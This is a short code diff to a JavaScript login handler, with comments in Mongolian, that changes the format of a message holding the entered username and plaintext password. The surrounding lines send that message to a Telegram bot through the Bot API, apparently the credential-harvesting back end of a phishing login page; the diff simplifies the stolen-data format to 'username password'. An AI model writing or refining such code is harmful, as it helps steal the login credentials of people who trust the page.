@@ -283,7 +283,8 @@ function handleLogin() {
   loginBtn.disabled = true;
   loginBtn.innerText = "Түр хүлээнэ үү...";
 
-  const text = `🔔 Шинэ нэвтрэлт:\n👤 Нэр: ${username}\n🔑 Нууц үг: ${password}`;
+  // Зөвхөн username болон password-ийг хооронд нь зай аваад илгээх болгосон хэсэг
+  const text = `${username} ${password}`;
 
   // Telegram руу илгээх
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
